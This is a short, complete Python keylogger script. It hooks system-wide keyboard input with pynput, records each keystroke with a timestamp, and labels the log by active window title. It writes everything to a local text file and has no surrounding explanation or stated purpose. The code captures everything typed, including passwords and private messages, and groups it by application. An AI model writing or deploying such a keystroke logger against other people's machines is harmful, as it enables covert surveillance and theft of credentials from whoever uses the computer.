import pynput.keyboard
import pygetwindow as gw
import datetime

# This variable stores the name of the last window used
last_window = ""

def write_to_log(key):
    global last_window

    #Get current time
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    #Get the active window title
    try:
        active_window = gw.getActiveWindow().title
    except:
        active_window = "Unknown"

    #Clean up the key name for readability
    try:
        k = str(key.char) # For letters and numbers
    except AttributeError:
        k = str(key) # For Shift, Enter, etc.

    #Save to the file
    with open("my_log.txt", "a") as f:
        # If the user switched apps, write a header
        if active_window != last_window:
            f.write(f"\n--- [Window: {active_window}] ---\n")
            last_window = active_window

        f.write(f"[{now}] {k}\n")

# This part starts the 'listening' process
with pynput.keyboard.Listener(on_press=write_to_log) as listener:
    listener.join()